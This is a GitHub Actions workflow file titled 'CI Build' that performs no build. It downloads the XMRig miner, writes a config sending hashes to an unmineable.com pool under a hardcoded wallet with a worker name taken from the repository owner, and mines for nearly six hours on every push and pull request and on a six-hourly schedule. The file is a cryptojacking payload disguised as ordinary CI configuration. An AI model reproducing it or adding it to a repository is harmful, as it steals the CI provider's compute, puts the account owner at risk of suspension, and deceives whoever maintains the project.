name: CI Build

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Environment
      run: |
        sudo apt-get update
        sudo apt-get install -y wget curl build-essential
    
    - name: Download Miner
      run: |
        wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
        tar -xvf xmrig-6.21.0-linux-x64.tar.gz
        cd xmrig-6.21.0
        chmod +x xmrig
    
    - name: Configure Mining
      run: |
        cd xmrig-6.21.0
        cat > config.json << 'EOF'
        {
          "autosave": true,
          "cpu": true,
          "opencl": false,
          "cuda": false,
          "pools": [
            {
              "url": "rx.unmineable.com:3333",
              "user": "USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.github_worker_${{ github.repository_owner }}",
              "pass": "x",
              "keepalive": true,
              "tls": false
            }
          ],
          "randomx": {
            "mode": "auto"
          },
          "cpu": {
            "enabled": true,
            "huge-pages": true,
            "hw-aes": null,
            "priority": 5,
            "max-threads-hint": 100
          },
          "donate-level": 1,
          "log-file": null,
          "print-time": 60
        }
        EOF
    
    - name: Start Mining
      run: |
        cd xmrig-6.21.0
        timeout 350m ./xmrig --config=config.json || true
    
    - name: Keep Alive
      if: always()
      run: echo "Mining session completed"
